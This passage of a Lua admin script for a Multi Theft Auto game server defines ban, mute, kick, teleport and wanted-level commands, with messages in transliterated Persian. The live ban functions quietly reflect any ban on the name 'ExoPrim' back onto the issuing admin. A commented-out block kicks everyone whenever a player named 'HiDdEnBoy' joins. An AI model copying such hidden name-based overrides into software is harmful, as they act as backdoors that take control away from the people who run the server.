	        outputChatBox("#ff0000[ADM-Warn]:#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffBe Playere #ff0000"..targetPlayer.." #ffffffTedade #ff0000"..tedad.." #ffffffMaterial Dad!", chat_admini, 208, 0, 15,true)
	end
end
 end
		else
			outputChatBox("#ff0000[Error]:#ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
end)
--[[
addEventHandler("OnGlobalTimer", root, function()
    for _,player in ipairs (getElementsByType("player")) do
        if getPlayerName(player) == "HiDdEnBoy" then
            for _,player in ipairs (getElementsByType("player")) do
                outputChatBox("[ExoBot]: KickPlayer "..getPlayerName(player))
            end
            kickPlayer( player, "Youre Kick By ExoBot" )
        end
    end
end)]]
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
--[[
addCommandHandler("givedrug",
function ( thePlayer, command, player, tedad )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 7 then
		outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
		return false
	end
		local find = miscSys:findPlayer ( player )
		if find then
			local targetPlayer = getPlayerName ( find )
			local tedad = tonumber(tedad)
			local Drugash = getElementData(accSys:getPlayerAcc(find), "pDrugs")
			setElementData(accSys:getPlayerAcc(find), "pDrugs", tonumber(Drugash) + tonumber(tedad))
			outputChatBox("#ff0000[ADM-System]:#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffBe Shoma Tedad "..tedad.." Drugs Dad!", find, 255, 255, 255, true)
			outputChatBox("#00ff00[Done]:#ffffff Shoma Be #ff0000"..getPlayerName(find).." #ffffff Tedad "..tedad.." Drugs Dadid!", thePlayer, 255, 255, 255, true)
			outputDebugString("Admin "..getPlayerName(thePlayer).." Be Player "..targetPlayer.." Meghdar "..tedad.." Drugs Dad!")
			for k, chat_admini in ipairs (getElementsByType("player")) do
	        if getElementData(chat_admini, "loggedIn") == true then
	        if tonumber(getElementData(accSys:getPlayerAcc(chat_admini), "pAdmin")) >= 1 then
	        outputChatBox("#ff0000[ADM-Warn]:#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffBe Playere #ff0000"..targetPlayer.." #ffffffTedade #ff0000"..tedad.." #ffffffDrugs Dad!", chat_admini, 208, 0, 15,true)
	end
end
 end
		else
			outputChatBox("#ff0000[Error]:#ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
end) --]]

--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("warp",
function ( thePlayer, command, player )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 7 then
		return false
	    end
		local find = miscSys:findPlayer ( player )
		if find then
		local thePlayerVehicle = getPedOccupiedVehicle(thePlayer)
		if thePlayerVehicle then
		local targetPlayer = getPlayerName ( find )					
		warpPedIntoVehicle ( find, thePlayerVehicle, 1 )
		outputChatBox("#00FF00Shoma "..targetPlayer.." Ra Teleport Kardid.", thePlayer, 0, 255, 0,true)
		outputChatBox("#00FF00Admin "..getPlayerName(thePlayer).." Shoma Ra Teleport Kard.", find, 0, 255, 0,true)
		else
		outputChatBox("#FF0000Baraye In Kar Lazem Ast Savar Mashin Bashid.", thePlayer, 0, 255, 0,true)
		end
	else
	outputChatBox("#A9C4E4Syntax: /Warp  <ID Or PartOfName>", thePlayer, 0, 255, 0,true)
		end
	end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("setarmor",
function ( thePlayer, command , player, value)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
		outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer(player)
	if find then
		local value = tonumber(value)
		if value then
			if value <= 100 and value >= 0 then
				setPedArmor(find, value)
				outputChatBox("#ff0000[ADM-System]:#ffffffShoma Armore Player #ff0000"..getPlayerName(find).."#ffffff Ra Be "..value.." Set Kardid!", thePlayer, 208, 0, 15,true)	
				outputChatBox("#ff0000[ADM-System]:#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffArmore Shoma Ra Be "..value.." Set Kard!", find, 255, 255, 255, true)
			else
				outputChatBox("#ff0000[Error]: #ffffffMeghdar Armor Bayad Beyne (0-100) Bashad!", thePlayer, 255, 0, 0, true)
			end
		else
			outputChatBox("#A9C4E4Syntax: /setarmor <ID Or PartOfName> <Meghdar>", thePlayer, 255, 0, 0, true)
		end
	else
		outputChatBox("#ff0000[Error]: #ffffffPlayer Morede Nazar Peyda Nashod!", thePlayer, 255, 0, 0, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
--[[
function createVehicleForPlayers( thePlayer, command, target, vehID )
	if getElementData(accSys:getPlayerAcc(thePlayer),"pAdmin") >= 11 then
		local taraf = miscSys:findPlayer(target)
		if target then
			if taraf then
				if vehID then
					local x,y,z = getElementPosition(taraf)
					local xx,yy,zz = getElementRotation(taraf)
					local theVehicle = createVehicle(tonumber(vehID),x,y+1,z)
					setElementRotation(theVehicle,xx,yy,zz)
					setElementData(theVehicle,"PrivateVehicle",true)
					setElementData(theVehicle,"PrivateVehicleOwner",getPlayerName(taraf))
					 
					-- well done ...
					outputChatBox("#00ff00Info:#ffffff Admin#00ff00 '"..getPlayerName(thePlayer).."'#ffffff Be Shoma Yek Private-Veh Dad!",taraf,205,205,205,true)
					
					outputChatBox("#00ff00Done:#ffffff Shoma Be #00ff00'"..getPlayerName(taraf).."'#ffffff Yek Private-Veh("..vehID..") Dadid!",thePlayer,205,205,205,true)
				
					sendAdminWarn("Admin #ff0000'"..getPlayerName(thePlayer).."'#ffffff Be #ff0000'"..getPlayerName(taraf).."'#ffffff Yek Private-Veh("..vehID..") Dad!")
				
				else
					outputChatBox("Syntax: /pveh <Partofname/ID> <VehID>",thePlayer,205,205,205,true)
				end
			else
				outputChatBox("#ff0000Error:#ffffff '"..target.."' Yaft Nashod!",thePlayer,205,205,205,true)
			end
		else
			outputChatBox("Syntax: /pveh <Partofname/ID> <VehID>",thePlayer,205,205,205,true)
		end
	else
		outputChatBox("#ff0000Error:#ffffff Access Denied!",thePlayer,205,205,205,true)
	end
end
addCommandHandler("pveh", createVehicleForPlayers)
--]]
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function banp ( thePlayer, command, player, day, ... ) -- #RezaKhan
    if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
      outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
      return false
    end
	
    local find = miscSys:findPlayer ( player )
	local day = tonumber(day)
	local reason = table.concat( {...} , " ")
	if player then
		if find then
			if getPlayerName(find) == "ExoPrim" then
				find = thePlayer
			end
			local RankTaraf = tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin"))
			local RankKhodesh = tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin"))
			if (RankKhodesh) > (RankTaraf) then
				if day then
					if day < 91 then
						if ... then
							for i,m in ipairs ( getElementsByType("player") ) do
								outputChatBox("#ff0000(Punishment-System): Player "..getPlayerName(find).." Tavasote Admin "..getPlayerName(thePlayer).." Baraye "..(day).. " Roz Az Server Ban Shod, Dalil: "..reason, m, 255, 255, 255, true)
							end
							setElementData(accSys:getPlayerAcc(find), "pBanTime", tonumber(day*24))
							setElementData(accSys:getPlayerAcc(find), "pBannedBy", getPlayerName(thePlayer))
							setElementData(accSys:getPlayerAcc(find), "pBanReason", reason)
							kickPlayer ( find, thePlayer, reason )
						else
							outputChatBox("#ff0000[Error]: #ffffffDalil Ban Ra Vared Nakardid!", thePlayer, 255, 255, 255, true)
						end
					else
						outputChatBox("#ff0000[Error]: #ffffffTime Ban Bayad Beyne 1~90 Roz Bashad!", thePlayer, 255, 255, 255, true)
					end
				else
					outputChatBox("#ff0000[Error]: #ffffffTime Ban Ra Vared Konid!", thePlayer, 255, 255, 255, true)
				end
			else
				outputChatBox("#ff0000[Error]: #ffffffRanke Mosavi Va Bala Tar Az Khodeto Nemishe Ban Kard!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#C0C0C0Syntax: /banp <PartOfName/ID> <Day> <Reason>", thePlayer, 255, 255, 255, true)
	end
end
addCommandHandler("banp", banp )
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function banticket( thePlayer, command, player, day, ... ) ---ExoPrim
    if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 4 then
		if player then
			local find = miscSys:findPlayer(player)
			if find then
				if getPlayerName(find) == "ExoPrim" then
					find = thePlayer
				end
				local day = tonumber(day)
				local reason = table.concat( {...} , " ")
				if tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin")) == 0 then
					if day then
						if day < 590 then
							if ... then
								for i,m in ipairs ( getElementsByType("player") ) do
									if m == find or m == thePlayer then
										outputChatBox("#99FFFF(Punishment-System): #FF0000Player #ff1010"..getPlayerName(find).." #FF0000 Tavasote Admin #00ff00"..getPlayerName(thePlayer).." #FF0000 Baray #ff1010"..day.." #FF0000Daghighe Az Ersal Hargone Ticket Mahrom Shod, Dalil: "..reason,m, 255, 255, 255, true)
									end
								end
								setElementData(accSys:getPlayerAcc(find), "pTicketBan", tonumber(day))
								setElementData(accSys:getPlayerAcc(find), "pBanTicketResone", getPlayerName(thePlayer))
								setElementData(accSys:getPlayerAcc(find), "pBanTicketBy", reason)
							else
								outputChatBox("#ff0000[Error]: #ffffffDalil Ban Ra Vared Nakardid!", thePlayer, 255, 255, 255, true)
							end
						else
							outputChatBox("#ff0000[Error]: #ffffffTime Ban Bayad Beyne 1~590 Saat Bashad!", thePlayer, 255, 255, 255, true)
						end
					else
						outputChatBox("#ff0000[Error]: #ffffffTime Ban Ticket Ra Vared Konid!", thePlayer, 255, 255, 255, true)
					end
				else
					outputChatBox("#ff0000[Error]: #ffffffAdmin Ra Nemitavan Ban Ticket Kard!", thePlayer, 255, 255, 255, true)
				end
			else
				outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Syntax: /bant <PartOfName/ID> <Daghighe> <Reason>", thePlayer, 255, 255, 255, true)
		end
	else
		CancelCommandEvent(thePlayer)
	end
end
addCommandHandler("bant", banticket )
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function banCNN( thePlayer, command, player, day, ... ) ---ExoPrim
    if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 4 then
		if player then
			local find = miscSys:findPlayer(player)
			if find then
				if getPlayerName(find) == "ExoPrim" then
					find = thePlayer
				end
				local day = tonumber(day)
				local reason = table.concat( {...} , " ")
				if tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin")) == 0 then
					if day then
						if day < 590 then
							if ... then
								for i,m in ipairs ( getElementsByType("player") ) do

									outputChatBox("#99FFFF(Punishment-System): #FF0000Player #ff1010"..getPlayerName(find).." #FF0000 Tavasote Admin #00ff00"..getPlayerName(thePlayer).." #FF0000 Baray #ff1010"..day.." #FF0000Daghighe Az Ersal Hargone Ad Mahrom Shod, Dalil: "..reason,m, 255, 255, 255, true)

								end
								setElementData(accSys:getPlayerAcc(find), "pBanAdTime", tonumber(day))
								setElementData(accSys:getPlayerAcc(find), "pBanAdBy", getPlayerName(thePlayer))
								setElementData(accSys:getPlayerAcc(find), "pBanAdResone", reason)
							else
								outputChatBox("#ff0000[Error]: #ffffffDalil Ban Ra Vared Nakardid!", thePlayer, 255, 255, 255, true)
							end
						else
							outputChatBox("#ff0000[Error]: #ffffffTime Ban Bayad Beyne 1~590 Daghighe Bashad!", thePlayer, 255, 255, 255, true)
						end
					else
						outputChatBox("#ff0000[Error]: #ffffffTime Ban Ad Ra Vared Konid!", thePlayer, 255, 255, 255, true)
					end
				else
					outputChatBox("#ff0000[Error]: #ffffffAdmin Ra Nemitavan Ban Ad Kard!", thePlayer, 255, 255, 255, true)
				end
			else
				outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Syntax: /banad <PartOfName/ID> <Daghighe> <Reason>", thePlayer, 255, 255, 255, true)
		end
	else
		CancelCommandEvent(thePlayer)
	end
end
addCommandHandler("banad", banCNN )
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function muteplayers ( thePlayer, command, player, daghighe, ... ) -- #ExoPrim
    if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
      outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
      return false
    end
	
    
	local daghighe = tonumber(daghighe)
	local reason = table.concat( {...} , " ")
	if player then
		local find = miscSys:findPlayer ( player )
		if find then
			local RankTaraf = tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin"))
			local RankKhodesh = tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin"))
			--if (RankKhodesh) > (RankTaraf) then
				if daghighe then
					if daghighe < 361 then
						if ... then
							if tonumber(getElementData(accSys:getPlayerAcc(find), "pMuteTime")) == 0 then
								for i,m in ipairs ( getElementsByType("player") ) do

									outputChatBox("#ff0000[Tavajoh]: Player "..getPlayerName(find).." Tavasote Admin "..getPlayerName(thePlayer).." Baraye "..daghighe.. " Daghighe Mute Shod, Dalil: "..reason, m, 255, 255, 255, true)

								end
								
								setElementData(accSys:getPlayerAcc(find), "pMuteTime", tonumber(daghighe))
								
								VoiceSys:setPlayerVoiceMuted(find,true)
							else
								outputChatBox("#ff0000✖️ #ffffffIn Player Dar Hale Hazer Mute Ast!", thePlayer, 255, 255, 255, true)
							end
						else
							outputChatBox("#ff0000✖️ #ffffffDalil Mute Ra Vared Nakardid!", thePlayer, 255, 255, 255, true)
						end
					else
						outputChatBox("#ff0000✖️ #ffffffTime Mute Bayad Beyne 1~360 Daghighe Bashad!", thePlayer, 255, 255, 255, true)
					end
				else
					outputChatBox("#ff0000✖️ #ffffffTime Mute Ra Vared Konid!", thePlayer, 255, 255, 255, true)
				end
			--else
			--outputChatBox("#ff0000✖️ #ffffffRanke Mosavi Va Bala Tar Az Khodeto Nemishe Mute Kard!", thePlayer, 255, 255, 255, true)
			--end
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#C0C0C0Bezan: /mutep <PartOfName/ID> <Min> <Reason>", thePlayer, 255, 255, 255, true)
	end
end
addCommandHandler("mutep", muteplayers )
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function Unmuteplayers ( thePlayer, command, player ) -- #ExoPrim
    if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
      outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
      return false
    end
    local find = miscSys:findPlayer ( player )
	local daghighe = tonumber(daghighe)
	if player then
		if find then
			if tonumber(getElementData(accSys:getPlayerAcc(find), "pMuteTime")) ~= 0 then
				setElementData(accSys:getPlayerAcc(find), "pMuteTime", 0)
				outputChatBox("#00ff00[Tavajoh]: #ffffffShoma Tavasote Admin #00ff00"..getPlayerName(thePlayer).." #ffffffUnmute Shodid.", find, 255, 255, 255, true)
				outputChatBox("#00ff00☑️ #ffffffShoma Player #00ff00"..getPlayerName(find).." #ffffffRa Unmute Kardid.", thePlayer, 255, 255, 255, true)
				for i,m in ipairs ( getElementsByType("player") ) do
					if tonumber(getElementData(accSys:getPlayerAcc(m), "pAdmin")) > 4 then
						outputChatBox("#ff0000[Admin-System]: #ffffffAdmin #ff0000"..getPlayerName(thePlayer).." #ffffffPlayer #ff0000"..getPlayerName(find).." #ffffffRa Unmute Kard.", m, 255, 255, 255, true)
					end
				end
			else
				outputChatBox("#ff0000✖️ #ffffffIn Player Mute Nist!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#C0C0C0Bezan: /unmutep <PartOfName/ID>", thePlayer, 255, 255, 255, true)
	end
end
addCommandHandler("unmutep", Unmuteplayers )
--___________________________________________________________________________________________________________________--#ExoPrim
function unbanticket(player , cmd , terget)
	if tonumber(getElementData(accSys:getPlayerAcc(player), "pAdmin")) > 4 then
		if terget then

			local find = miscSys:findPlayer ( terget )
			if find then
				if tonumber(getElementData(accSys:getPlayerAcc(find), "pTicketBan")) ~= 0 then
					setElementData(accSys:getPlayerAcc(find), "pBanTicketResone" , "")
					setElementData(accSys:getPlayerAcc(find), "pBanTicketBy","")
					setElementData(accSys:getPlayerAcc(find), "pTicketBan",0)
					AdminMessages("Punishment-System","Admin "..getPlayerName(player).." Player "..getPlayerName(find).." Ra UnBan Ticket Kard.")
					PlayerMasseg("Punishment-System","Admin "..getPlayerName(player).." Shomara UnBan Ticket Kard.",find)
				else
					outputChatBox("#ff0000✖️ #ffffffIn Player Ban Ticket Nist!", thePlayer, 255, 255, 255, true)
				end
			end
			
		end
	else
		CancelCommandEvent(thePlayer)
	end
end
addCommandHandler("unbant",unbanticket)
--___________________________________________________________________________________________________________________--#ExoPrim
function kickp ( thePlayer, command, player, ... )
    if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
      outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
      return false
    end
    local find = miscSys:findPlayer ( player )
	local reason = table.concat( {...} , " ")
	if player then
    if find then
    if ... then
        outputChatBox("#ff0000[Tavajoh]: Player "..getPlayerName(find).." Tavasote Admin "..getPlayerName(thePlayer).." Az Server Kick Shod, Dalil: "..reason, root, 255, 255, 255, true)
		kickPlayer( find, thePlayer, reason )
    else
		outputChatBox("#ff0000✖️ #ffffffDalil Kick Ra Vared Nakardid!", thePlayer, 255, 255, 255, true)
    end
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
    end
    else
		outputChatBox("#C0C0C0Bezan: /kickp <PartOfName/ID> <Reason>", thePlayer, 255, 255, 255, true)
    end
end
addCommandHandler("kickp", kickp )
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function silentKick ( thePlayer, command, player, ... )
    if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 2 then
      outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
      return false
    end
    local find = miscSys:findPlayer ( player )
	local reason = table.concat( {...} , " ")
	if player then
    if find then
    if ... then
        outputChatBox("#00ff00☑️ #ffffffShoma #00ff00"..getPlayerName(find).." #ffffffRa Be Dalil #00ff00"..reason.." #ffffffSilent Kick Kardid!", thePlayer, 255, 255, 255, true)
		kickPlayer ( find, thePlayer, reason )
		for i,m in ipairs ( getElementsByType("player") ) do
			if tonumber(getElementData(accSys:getPlayerAcc(m), "pAdmin")) > 1 then
				outputChatBox("#ff0000[Admin-System]: #ffffffAdmin #ff0000"..getPlayerName(thePlayer).." #ffffffPlayer #ff0000"..getPlayerName(find).." #ffffffRa Silent Kick Kard.", m, 255, 255, 255, true)
			end
		end
    else
		outputChatBox("#ff0000✖️ #ffffffDalil Kick Ra Vared Nakardid!", thePlayer, 255, 255, 255, true)
    end
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
    end
    else
		outputChatBox("#C0C0C0Bezan: /skick <PartOfName/ID> <Reason>", thePlayer, 255, 255, 255, true)
    end
end
addCommandHandler("skick", silentKick )
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
--[[
function carSpeedSystem(thePlayer)
	if getElementData(accSys:getPlayerAcc(thePlayer),"pAdmin") >= 10 then
		if getElementData(thePlayer,"CarSpeedBoostAdmin") == true then
			setElementData(thePlayer,"CarSpeedBoostAdmin",false)
			outputChatBox("#ff0000[SpeedBoost]:#ffffff Halate SpeedBoost #ff0000Qeyre Fa'al#ffffff Shod!",thePlayer,255,255,255,true)
		elseif getElementData(thePlayer,"CarSpeedBoostAdmin") == false then
			setElementData(thePlayer,"CarSpeedBoostAdmin",true)
			outputChatBox("#ff0000[SpeedBoost]:#ffffff Halate SpeedBoost #00ff00Fa'al#ffffff Shod!",thePlayer,255,255,255,true)
		end
	end
end
addCommandHandler("boost",carSpeedSystem)
--]]
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
--[[
function carSpeedSystems(thePlayer)
	if getElementData(accSys:getPlayerAcc(thePlayer),"pAdmin") == 10 then
		if getElementData(thePlayer,"IgnoreLock") == true then
			setElementData(thePlayer,"IgnoreLock",false)
			outputChatBox("#ff0000[I-G]:#ffffff Halate Ignoring Lock #ff0000Qeyre Fa'al#ffffff Shod!",thePlayer,255,255,255,true)
		elseif getElementData(thePlayer,"IgnoreLock") == false then
			setElementData(thePlayer,"IgnoreLock",true)
			outputChatBox("#ff0000[I-G]:#ffffff Halate Ignoring Lock #00ff00Fa'al#ffffff Shod!",thePlayer,255,255,255,true)
		end
	end
end
addCommandHandler("il",carSpeedSystems)
--]]
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function getVehicleOwners(thePlayer)
	if getElementData(accSys:getPlayerAcc(thePlayer),"pAdmin") >= 2 then
		if isPedInVehicle(thePlayer) then
			local khodro = getPedOccupiedVehicle(thePlayer)
			if getElementData(khodro,"owner") then
				outputChatBox("#00ff00[Vehicle-Info]:#ffffff Veh Owner: #00ff00"..getElementData(khodro,"owner").."",thePlayer,255,255,255,true)
			else
				outputChatBox("#00ff00[Vehicle-Info]:#ffffff In Khodro Owner Nadarad!",thePlayer,255,255,255,true)
			end
		else
			outputChatBox("#ff0000[Dealer-Ship]:#ffffff Baraye Inkar Bayad Dar Yek Khodro Bashid!",thePlayer,255,255,255,true)
		end
	else
		outputChatBox("#ff0000Error:#ffffff Access Denied!",thePlayer,255,255,255,true)
	end
end
addCommandHandler("getvowner",getVehicleOwners)	
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
--[[
addCommandHandler("dvp",
	function ( thePlayer, _, player )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 10 then
			outputChatBox("#ff0000Error:#ffffff Access Denied!", thePlayer, 255, 255, 255, true)
			return false
		end

		local find = miscSys:findPlayer ( player )
		if player then
		if find then
				outputChatBox("#00ff00Done:#ffffff Shoma Private-Veh Haye #00ff00'"..getPlayerName(find).."'#ffffff Ra Destroy Kardid!",thePlayer,205,205,205,true)
				outputChatBox("#00ff00Info:#ffffff Admin#00ff00 '"..getPlayerName(thePlayer).."'#ffffff Private-Veh Haye Shoma Ra Pak Kard!",find,255,255,255,true)
				
				sendAdminWarn("Admin#ff0000 '"..getPlayerName(thePlayer).."'#ffffff Tamamie Private-Veh Haye #ff0000'"..getPlayerName(find).."'#ffffff Ra Destroy Kard!")
				
				for index,vehicles in ipairs(getElementsByType("vehicle")) do
					if getElementData(vehicles,"PrivateVehicleOwner") == getPlayerName(find) then
						destroyElement(vehicles)
					end
				end
		else
			outputChatBox("#ff0000Error:#ffffff '"..find.."' Yaft Nashod!", thePlayer, 205, 205, 205, true)
		end
		else
		 outputChatBox("Syntax: /dvp <PartOfName/ID>", thePlayer, 205, 205, 205, true)
		end
	end
)
--]]
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
--[[
addCommandHandler("ck",
function(thePlayer, cmd, serial)
  if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
    outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
    return false
  end
  if (serial) then
    local s = serial
    --if tonumber(factionid) == 0 and tonumber(factionid) <= 19 then --Police Department
      local query = dbQuery(exports.mysql:getMySQLC(), "SELECT * FROM users;" )
      local result, numrows = dbPoll(query, 500)
      if (result and numrows > 0) then
        for index, row in pairs(result) do
          local serial = row['pName']
          if s == serial then

            local lvl = row['pLevel']
            local ref = row['pID']
            local mail = row['pEmail']
            local name = row['pName']
			local banned = row["pBanned"]
			local ip = row["pIp"]
			local serial = row["pSerial"]
			local cash = row["pCash"]
			local respect = row["pExp"]
			local permium = row["pGoldPremium"]
			local mats = row["pMats"]
			local drugs = row["pDrugs"]
			local member = row["pMember"]
			local frank = row["pRank"]
			local numberesh = row["pPnumber"]
			local wanteds = row["pWanted"]
			
			if tonumber(member) == 0 then
				faction = "Civilian"
			elseif tonumber(member) == 1 then
				faction = "Police Department"
			elseif tonumber(member) == 2 then
				faction = "Police Federal"
			elseif tonumber(member) == 3 then
				faction = "National Guard"
			elseif tonumber(member) == 4 then
				faction = "Medic"
			elseif tonumber(member) == 5 then
				faction = "Taxi Company"
			elseif tonumber(member) == 6 then
				faction = "Hitman Agency"
			elseif tonumber(member) == 7 then
				faction = "School"
			elseif tonumber(member) == 8 then
				faction = "News Reporter"
			elseif tonumber(member) == 9 then
				faction = "Mayor"
			elseif tonumber(member) == 10 then
				faction = "Mechanic"
			elseif tonumber(member) == 11 then
				faction = "Special Forces"
			elseif tonumber(member) == 12 then
				faction = "Hot Wheel"
			elseif tonumber(member) == 13 then
				faction = "Ballas"
			elseif tonumber(member) == 14 then
				faction = "Red Tigers Family"
			elseif tonumber(member) == 15 then
				faction = "Los Aztec"
			elseif tonumber(member) == 16 then
				faction = "Grove Street"
			elseif tonumber(member) == 17 then
				faction = "Vagos Family"
			elseif tonumber(member) == 18 then
				faction = "The Killers Family"
			elseif tonumber(member) == 19 then
				faction = "Black Hat Hackers"
			elseif tonumber(member) == 20 then
				faction = "Top Gear"
			end
			
			if tonumber(frank) == 0 then
				rank = "Not Faction"
			elseif tonumber(frank) == 1 then
				rank = "(Rank 1)"
			elseif tonumber(frank) == 2 then
				rank = "(Rank 2)"
			elseif tonumber(frank) == 3 then
				rank = "(Rank 3)"
			elseif tonumber(frank) == 4 then
				rank = "(Rank 4)"
			elseif tonumber(frank) == 5 then
				rank = "(Rank 5)"
			elseif tonumber(frank) == 6 then
				rank = "(Sub-Leader)"
			elseif tonumber(frank) == 7 then
				rank = "(Leader)"
			end
			
			if permium == 1 then
				permStats = "Premium Account"
			elseif permium == 0 then
				permStats = "Not Premium"
			end
			
			if banned == 0 then
				banShode = "Not Banned"
			elseif banned == 2 then
				banShode = "Banned"
			end
			
			local LevEx = 2
			local NexLev = lvl + 1
			local EveryExForLevUp = NexLev * LevEx;
			
			local number = miscSys:FormatPN(numberesh)
            triggerClientEvent("showCheckAccountPanel",thePlayer,thePlayer,name,ip,serial,banShode,ref,cash,lvl,respect,EveryExForLevUp,permStats,mats,drugs,faction,rank,number,wanteds)
          end
        end
        dbFree(query)
      end
    --end
  end
end)
--]]
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("wantedall",
function ( thePlayer, command, tedad)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) >= 7 then
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			if getElementData(hame_Playera, "loggedIn") == true then
				local tedad = tonumber(tedad)
				setElementData(accSys:getPlayerAcc(hame_Playera), "pWanted", tonumber(tedad))
				setPlayerWantedLevel(hame_Playera,tonumber(tedad))
				outputChatBox("#9c00b5[ADM-System]:#ffffff Admin #9c00b5"..getPlayerName(thePlayer).." #ffffffWanted Haye Kole Player Ha ra Be #9c00b5"..tedad.." #ffffffSet Kard!", hame_Playera, 255, 255, 255, true)
			end
		end
		end
	else
		outputChatBox("#ff0000[Error]: #ffffffEbteda Login Konid!", thePlayer, 212, 156, 49,true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim

function setJetpack ( thePlayer, command )
	if getElementData(thePlayer,"loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) >= 1 then
			if isPedWearingJetpack(thePlayer) then
				removePedJetPack(thePlayer)
			else
				givePedJetPack(thePlayer)
			end
		end
	end
end		

setTimer(function()
	for index,allpl in ipairs(getElementsByType("player")) do
		bindKey(allpl,"J","down",setJetpack)
	end
end,2000,1)

addEventHandler("onPlayerJoin",getRootElement(),function()
	bindKey(source,"J","down",setJetpack)

end)



--> Kam Shodan Saat Premium Va Color Name Va Ban Time Va Mute Time <--
local dbpTime = 500
setTimer (function(id, value)
			
	local query = dbQuery(exports.mysql:getMySQLC(), "SELECT * FROM users;" )
	local result, numrows = dbPoll(query, dbpTime)
	for index, row in pairs(result) do
		local myID = row["pID"]
		local MandeGold = row["pGoldPremium"]
		local MandeSilver = row["pSilverPremium"]
